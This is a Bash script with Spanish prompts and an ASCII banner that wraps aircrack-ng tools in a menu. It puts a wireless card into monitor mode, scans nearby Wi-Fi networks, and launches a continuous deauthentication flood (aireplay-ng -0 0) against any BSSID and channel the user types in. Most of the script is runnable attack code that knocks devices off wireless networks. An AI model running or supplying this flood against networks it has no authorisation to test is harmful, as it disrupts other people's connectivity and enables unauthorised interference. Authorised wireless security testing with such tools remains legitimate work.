#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# Validacion de permisios de root
if [ $(whoami) != "root" ]; then
	echo -e "[!] Este script necesita privilegios"
	exit 1
fi
# ctrl+c
function ctrl_c(){
echo -e "\n${redColour}[!]${endColour} ${blueColour}Ataque detenido.${endColour}\n"
menuPrincipal
}
	
trap ctrl_c INT

#Funciones
function configTargMon(){
	echo -e "[+] Targetas de red disponibles:"
	echo -e "$(ifconfig | grep 'flags=' | awk '{print $1}' | tr -d ':' | grep -v lo)"
	echo -ne "[+] Seleccione una opcion: " && read opt2
	echo -e "[+] Configurar targeta a:"
	echo -e "monitor\nmanage"
	echo -ne "[+] Seleccione una opcion: " && read opt3
	if [ $opt3 == "monitor" ];then
		sudo airmon-ng start $opt2
	elif [ $opt3 == "manage" ]; then
		sudo airmon-ng stop $opt2
	else
		echo -e "[!] Opcion invalida."
		configTargMon
	fi
	if [ $(echo $?) == 0 ]; then
		echo -e "[+] Targeta configurada con exito!"
		sleep 1
		menuPrincipal
	else
		echo -e "[!] Ha ocurrido un error."
		sleep 1
		menuPrincipal
	fi
}
function airodump-ng(){
	echo -e "[i] Seleccione targeta de red, recuerde que esta opcion necesita tener una targeta en modo monitor: "
	echo -e "$(ifconfig | grep 'flags=' | awk '{print $1}' | tr -d ':' | grep -v lo | grep 'mon')"
	echo -ne "[+] Seleccion: " && read opt4
	sudo airodump-ng $opt4
	if [ $(echo $?) == 0 ]; then
		sleep 1
		menuPrincipal
	else
		echo -e "[!] Ha ocurrido un error."
		sleep 1
		menuPrincipal
	fi
		
}

function aireplay(){

	echo -e "[+] Seleccione la targeta de red para el ataque, debe estar en modo monitor: "
	echo -e "$(ifconfig | grep 'flags=' | awk '{print $1}' | tr -d ':' | grep -v lo | grep 'mon')"
	echo -ne "[+] Seleccion: " && read targetaDeAtaque 
	echo -ne "[+] Ingrese el bssid de la red a atacar: " && read bssid
	echo -ne "[+] Ingrese canal de la red a atacar: " && read canal
	sudo iwconfig $targetaDeAtaque channel $canal
	sudo aireplay-ng -0 0 -a $bssid $targetaDeAtaque

}

function menuPrincipal(){

clear
# Banner
echo -e "\n${redColour}  ██████  ▒█████   ███▄    █ ▓█████▄  ▄▄▄      ${endColour}"
echo -e "${redColour}▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ██▌▒████▄    ${endColour}"
echo -e "${redColour}░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒░██   █▌▒██  ▀█▄  ${endColour}"
echo -e "${redColour}  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒░▓█▄   ▌░██▄▄▄▄██ ${endColour}"
echo -e "${redColour}▒██████▒▒░ ████▓▒░▒██░   ▓██░░▒████▓  ▓█   ▓██▒${endColour}"
echo -e "${redColour}▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒▓  ▒  ▒▒   ▓▒█░${endColour}"
echo -e "${redColour}░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ▒  ▒   ▒   ▒▒ ░${endColour}"
echo -e "${redColour}░  ░  ░  ░ ░ ░ ▒     ░   ░ ░  ░ ░  ░   ░   ▒   ${endColour}"
echo -e "${redColour}      ░      ░ ░           ░    ░          ░  ░${endColour}"
echo -e "${redColour}                              ░                ${endColour}"

echo -e "[+] Menu principal: "
echo -e "\t[1] Configurar una targeta de red."
echo -e "\t[2] Listar redes wifi disponibles."
echo -e "\t[3] Escanear redes con airodump-ng"
echo -e "\t[4] Enviar paquetes de desauntenticacion con aireplay-ng"
echo -e "\t[5] salir."
echo -ne "[i] Seleccione una opcion:" && read opc1

case $opc1 in
	1) clear; configTargMon;;
	2) gnome-terminal -- bash -c "nmcli device wifi list";menuPrincipal ;;
	3) airodump-ng;;
	4) aireplay;;
	5) exit 0;;
esac

}

menuPrincipal
